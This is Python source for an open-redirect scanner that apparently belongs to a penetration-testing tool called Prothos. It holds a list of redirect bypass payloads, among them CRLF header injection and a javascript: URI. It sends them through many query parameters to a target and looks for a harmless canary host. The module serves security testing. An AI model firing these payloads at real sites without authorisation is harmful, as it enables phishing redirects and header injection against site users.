import asyncio
import json
import re
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import httpx
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn

console = Console()

REDIRECT_PARAMS: list[str] = [
    "url", "redirect", "redirect_url", "redirect_uri", "redirecturl", "redir",
    "next", "return", "returnurl", "return_url", "returnto", "return_to",
    "goto", "go", "dest", "destination", "continue", "continueto", "forward",
    "rurl", "target", "to", "out", "view", "link", "callback", "callback_url",
    "checkout_url", "image_url", "page", "path", "u", "r", "n", "ref", "location",
    "domain", "site", "host", "back", "backurl", "successurl", "success_url",
    "cancelurl", "data", "qurl", "login_url", "logout", "redirect_to",
]

CANARY = "prothos-redirect-canary.example"

BYPASS_PAYLOADS: list[str] = [
    f"https://{CANARY}",
    f"http://{CANARY}",
    f"//{CANARY}",
    f"///{CANARY}",
    f"////{CANARY}",
    f"https:/{CANARY}",
    f"https:{CANARY}",
    f"\\\\{CANARY}",
    f"\\/{CANARY}",
    f"/\\{CANARY}",
    f"//{CANARY}/%2f..",
    f"/%09/{CANARY}",
    f"/%2f{CANARY}",
    f"https://trusted@{CANARY}",
    f"https://{CANARY}%2f@trusted.com",
    f"https://{CANARY}#@trusted.com",
    f"https://{CANARY}?@trusted.com",
    f"https://trusted.com.{CANARY}",
    f"https://trusted.com@{CANARY}",
    f"https%3A%2F%2F{CANARY}",
    f"https%253A%252F%252F{CANARY}",
    f"%2F%2F{CANARY}",
    f"%68%74%74%70%73%3A%2F%2F{CANARY}",
    f"https://{CANARY}\r\nSet-Cookie: prothos=1",
    f"https://{CANARY}%0d%0aSet-Cookie:prothos=1",
    f"htTps://{CANARY}",
    f"javascript://{CANARY}/%0aalert(1)",
    f"data:text/html,https://{CANARY}",
    f"//{CANARY}@trusted.com",
]

SEVERITY_COLOR = {
    "critical": "bold red",
    "high":     "red",
    "medium":   "yellow",
    "low":      "dim",
    "info":     "cyan",
}


@dataclass
class RedirectFinding:
    url:        str
    param:      str
    payload:    str
    method:     str
    location:   str          = ""
    status:     int          = 0
    evidence:   str          = ""
    severity:   str          = "medium"

    def to_dict(self) -> dict:
        return self.__dict__.copy()


@dataclass
class OpenRedirectReport:
    target:      str
    started_at:  str                     = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    finished_at: Optional[str]          = None
    params:      list[str]              = field(default_factory=list)
    total:       int                    = 0
    findings:    list[RedirectFinding]  = field(default_factory=list)
    errors:      list[str]              = field(default_factory=list)

    @property
    def medium(self) -> list[RedirectFinding]:
        return [f for f in self.findings if f.severity == "medium"]

    def to_dict(self) -> dict:
        d = self.__dict__.copy()
        d["findings"] = [f.to_dict() for f in self.findings]
        return d


def _set_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_query = urlencode(qs, doseq=True, safe="/:?#@%\\")
    return urlunparse(parsed._replace(query=new_query))


def _candidate_params(url: str) -> list[str]:
    parsed = urlparse(url)
    existing = list(parse_qs(parsed.query).keys())
    params = [p for p in existing if p.lower() in REDIRECT_PARAMS]
    params += [p for p in REDIRECT_PARAMS if p not in params]
    return params


def _location_redirects_to_canary(location: str) -> bool:
    if not location:
        return False
    loc = location.lower()
    if CANARY in loc:
        host = urlparse(location if "://" in location else f"http:{location}").hostname or ""
        return CANARY in host or loc.startswith(("//", "/\\", "\\", "https://" + CANARY, "http://" + CANARY))
    return False


def _body_redirects_to_canary(body: str) -> Optional[str]:
    patterns = [
        rf'(?:window\.location|location\.href|location\.replace)\s*[=(]\s*["\']([^"\']*{re.escape(CANARY)}[^"\']*)',
        rf'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+url=([^"\'>\s]*{re.escape(CANARY)}[^"\'>\s]*)',
    ]
    for pat in patterns:
        m = re.search(pat, body, re.IGNORECASE)
        if m:
            return m.group(1)[:120]
    return None


async def _test_param(
    client: httpx.AsyncClient,
    url:    str,
    param:  str,
    sem:    asyncio.Semaphore,
) -> list[RedirectFinding]:

    findings: list[RedirectFinding] = []

    async with sem:
        for payload in BYPASS_PAYLOADS:
            test_url = _set_param(url, param, payload)
            try:
                r = await client.get(test_url, timeout=10)
            except Exception:
                continue

            headers = {k.lower(): v for k, v in r.headers.items()}
            location = headers.get("location", "")

            if r.status_code in (301, 302, 303, 307, 308) and _location_redirects_to_canary(location):
                f = RedirectFinding(
                    url=url, param=param, payload=payload, method="Location",
                    location=location[:120], status=r.status_code,
                    evidence=f"Location: {location[:80]}", severity="medium",
                )
                findings.append(f)
                _print_finding(f)
                break

            body_hit = _body_redirects_to_canary(r.text)
            if body_hit:
                f = RedirectFinding(
                    url=url, param=param, payload=payload, method="Body",
                    location=body_hit, status=r.status_code,
                    evidence=f"body redirect: {body_hit}", severity="medium",
                )
                findings.append(f)
                _print_finding(f)
                break

    return findings


def _print_finding(f: RedirectFinding):
    color = SEVERITY_COLOR.get(f.severity, "white")
    console.print(
        f"  [{color}][{f.severity.upper()}][/{color}] "
        f"[bold white]{f.param}[/bold white] → "
        f"[yellow]open redirect ({f.method})[/yellow]  "
        f"[dim]payload: {f.payload[:45]}[/dim]"
    )


def _display(report: OpenRedirectReport):
    console.print()
    console.print(Panel(
        f"[bold white]{report.target}[/bold white]  "
        f"[dim]params:[/dim] {len(report.params)}  "
        f"[dim]requests:[/dim] {report.total}  "
        f"[dim]findings:[/dim] [yellow]{len(report.findings)}[/yellow]",
        title="[bold red]Open Redirect — Summary[/bold red]",
        border_style="red",
    ))

    if not report.findings:
        console.print("[dim]    No open redirects found.[/dim]\n")
        return

    table = Table(show_header=True, header_style="bold red", border_style="dim")
    table.add_column("Severity",  width=10)
    table.add_column("Param",     style="bold white", width=18)
    table.add_column("Method",    style="cyan", width=10)
    table.add_column("Status",    style="dim", width=7)
    table.add_column("Payload",   style="yellow", min_width=35)

    for f in report.findings:
        color = SEVERITY_COLOR.get(f.severity, "white")
        table.add_row(
            f"[{color}]{f.severity}[/{color}]",
            f.param,
            f.method,
            str(f.status) if f.status else "-",
            f.payload[:50],
        )

    console.print(table)
    console.print()


async def _redirect_async(
    target:      str,
    concurrency: int,
    proxy:       Optional[str],
) -> OpenRedirectReport:

    report = OpenRedirectReport(target=target)
    params = _candidate_params(target)
    report.params = params
    report.total  = len(params) * len(BYPASS_PAYLOADS)
    sem    = asyncio.Semaphore(concurrency)

    async with httpx.AsyncClient(
        verify=False,
        follow_redirects=False,
        proxy=proxy,
        headers={"User-Agent": "Mozilla/5.0 (compatible; Prothos/1.0)"},
    ) as client:

        with Progress(
            SpinnerColumn(style="red"),
            TextColumn("[bold white]{task.description}"),
            BarColumn(bar_width=35, style="red", complete_style="green"),
            TextColumn("[green]{task.completed}[/green]/[white]{task.total}[/white]"),
            TimeElapsedColumn(),
            console=console,
            transient=True,
        ) as progress:
            task_id = progress.add_task("Testing redirects...", total=len(params))

            tasks = [_test_param(client, target, p, sem) for p in params]
            for coro in asyncio.as_completed(tasks):
                report.findings.extend(await coro)
                progress.advance(task_id, 1)

    report.finished_at = datetime.now(timezone.utc).isoformat()
    return report


def run_open_redirect_scan(
    target:      str,
    concurrency: int            = 15,
    proxy:       Optional[str]  = None,
    save_json:   Optional[str]  = None,
) -> OpenRedirectReport:

    console.print(f"\n[bold red][*][/bold red] Open Redirect → [bold white]{target}[/bold white]")
    console.print(f"[dim]    Params: {len(_candidate_params(target))}  "
                  f"Payloads: {len(BYPASS_PAYLOADS)}[/dim]")

    report = asyncio.run(_redirect_async(
        target=target,
        concurrency=concurrency,
        proxy=proxy,
    ))

    _display(report)

    if save_json:
        try:
            with open(save_json, "w") as f:
                json.dump(report.to_dict(), f, indent=2, default=str)
            console.print(f"[dim][+] Saved to {save_json}[/dim]")
        except OSError as e:
            console.print(f"[red][!] Failed to save: {e}[/red]")

    return report
